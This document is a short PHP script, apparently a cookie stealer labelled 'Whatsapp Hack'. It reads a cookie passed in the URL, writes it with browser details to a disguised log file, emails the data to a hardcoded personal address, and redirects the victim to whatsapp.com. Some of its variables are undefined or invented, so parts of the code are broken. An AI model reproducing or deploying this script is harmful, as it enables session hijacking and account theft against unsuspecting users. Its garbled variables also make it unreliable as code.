<?php
 $database = $_WHATSAPP_DATA['USER_DATABASE'];
 $Key = $_USER_KEY['ADDR_KEY_DATABASE'];
 $cookie = $_GET['cookie'];
 $browser = $_SERVER['HTTP_USER_AGENT']; $redirect =
$_GET['redirect'];
 $data = "IP: " . $ip . "\n" ."Cookie: " . $cookie . "\n" ."Referrer: " . $referer .
"\n" ."Browser: " . $browser . "\n\n";
 $database_log = "Whatsapp.rar";
 @chmod($database_log, 0777);
 $f = fopen($database_log, 'a');
 fwrite($f, $data); fclose($f);
 $email = 'dishank.agrawal123@gmail.com';
$content = nl2br($data);
$name = "Whatsapp Hack";
$sender = 'admin@iptrace.com';
$subject = 'Whatsapp Hack Details';
$headers = "From: $name "."<".$sender.">\r\n";
mail($email, $subject, $content, $headers );
@header("Location:https://whatsapp.com");
 ?>